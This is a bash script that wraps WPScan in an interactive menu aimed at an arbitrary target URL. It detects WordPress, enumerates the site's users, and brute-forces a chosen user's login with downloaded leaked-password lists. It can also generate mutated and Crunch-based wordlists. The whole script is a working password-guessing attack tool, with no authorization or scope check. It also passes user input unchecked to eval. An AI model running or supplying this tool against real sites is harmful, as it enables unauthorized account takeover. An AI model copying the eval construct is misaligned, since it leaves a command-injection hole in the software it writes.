#!/bin/bash

# WPScan Tool + Multiple Wordlists + Custom + Crunch Full Support

# Built-in wordlists
WORDLISTS=(
    "/tmp/rockyou.txt"
    "/tmp/darkc0de.lst"
    "/tmp/10k_most_common.txt"
)
NAMES=("rockyou.txt" "darkc0de.lst" "10k_most_common.txt")
URLS=(
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/darkc0de.lst"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
)

GENERATED_WORDLIST="/tmp/generated_wordlist.txt"
CRUNCH_WORDLIST="/tmp/crunch_custom.txt"

# Check for Crunch
if ! command -v crunch &> /dev/null; then
    echo "Crunch not found. Installing..."
    sudo apt update && sudo apt install crunch -y
fi

echo "=============================="
echo "     WPScan Tool Menu"
echo "=============================="

read -p "Enter the target URL (e.g., https://example.com): " TARGET

# Download missing wordlists
for i in "${!WORDLISTS[@]}"; do
    if [ ! -f "${WORDLISTS[$i]}" ]; then
        echo "Downloading ${NAMES[$i]}..."
        wget -q "${URLS[$i]}" -O "${WORDLISTS[$i]}"
    fi
done

while true; do
    echo ""
    echo "Choose an option:"
    echo "1) Check if site is WordPress"
    echo "2) Enumerate users"
    echo "3) Brute-force login with wordlist"
    echo "4) Generate new wordlist using base + patterns"
    echo "5) Generate full custom Crunch wordlist"
    echo "6) Exit"
    read -p "Option: " OPTION

    case $OPTION in
        1)
            wpscan --url "$TARGET"
            ;;
        2)
            wpscan --url "$TARGET" --enumerate u
            ;;
        3)
            read -p "Enter username to attack: " USERNAME
            echo "Choose a wordlist:"
            for i in "${!NAMES[@]}"; do
                echo "$((i+1))) ${NAMES[$i]}"
            done
            echo "$(( ${#NAMES[@]} + 1 ))) Custom wordlist"
            echo "$(( ${#NAMES[@]} + 2 ))) Generated wordlist (base+pattern)"
            echo "$(( ${#NAMES[@]} + 3 ))) Custom Crunch wordlist"
            read -p "Option [1-$(( ${#NAMES[@]} + 3 ))]: " WORDLIST_OPTION

            if [[ $WORDLIST_OPTION -ge 1 && $WORDLIST_OPTION -le ${#NAMES[@]} ]]; then
                CHOSEN_WORDLIST="${WORDLISTS[$((WORDLIST_OPTION - 1))]}"
            elif [[ $WORDLIST_OPTION -eq $(( ${#NAMES[@]} + 1 )) ]]; then
                read -p "Enter full path to your wordlist: " CUSTOM_PATH
                [[ -f "$CUSTOM_PATH" ]] && CHOSEN_WORDLIST="$CUSTOM_PATH" || { echo "File not found."; continue; }
            elif [[ $WORDLIST_OPTION -eq $(( ${#NAMES[@]} + 2 )) ]]; then
                [[ -f "$GENERATED_WORDLIST" ]] && CHOSEN_WORDLIST="$GENERATED_WORDLIST" || { echo "No generated wordlist found."; continue; }
            elif [[ $WORDLIST_OPTION -eq $(( ${#NAMES[@]} + 3 )) ]]; then
                [[ -f "$CRUNCH_WORDLIST" ]] && CHOSEN_WORDLIST="$CRUNCH_WORDLIST" || { echo "No Crunch wordlist generated."; continue; }
            else
                echo "Invalid selection."
                continue
            fi

            wpscan --url "$TARGET" --usernames "$USERNAME" --passwords "$CHOSEN_WORDLIST"
            ;;
        4)
            read -p "Enter path to your base wordlist: " BASE_PATH
            if [[ ! -f "$BASE_PATH" ]]; then
                echo "❌ File not found: $BASE_PATH"
                continue
            fi

            echo "Generating pattern-based wordlist..."
            > "$GENERATED_WORDLIST"
            while read -r word; do
                echo "$word" >> "$GENERATED_WORDLIST"
                echo "${word}123" >> "$GENERATED_WORDLIST"
                echo "${word}2024" >> "$GENERATED_WORDLIST"
                echo "${word}!" >> "$GENERATED_WORDLIST"
                echo "$(tr '[:lower:]' '[:upper:]' <<< ${word})" >> "$GENERATED_WORDLIST"
            done < "$BASE_PATH"
            echo "✅ Saved to: $GENERATED_WORDLIST"
            ;;
        5)
            echo "🧠 Full Crunch syntax (e.g., crunch 6 6 abc123 -t @@2024@@)"
            echo "Enter full crunch command WITHOUT output (-o) argument."
            echo "Example: crunch 6 6 -t @@2024@@ -f /usr/share/crunch/charset.lst mixalpha-numeric"
            read -p "crunch " CRUNCH_ARGS

            echo "Generating with: crunch $CRUNCH_ARGS -o $CRUNCH_WORDLIST"
            eval crunch $CRUNCH_ARGS -o "$CRUNCH_WORDLIST"

            if [[ $? -eq 0 ]]; then
                echo "✅ Crunch wordlist saved to: $CRUNCH_WORDLIST"
            else
                echo "❌ Crunch failed. Check syntax."
            fi
            ;;
        6)
            echo "Goodbye!"
            break
            ;;
        *)
            echo "Invalid option."
            ;;
    esac
done
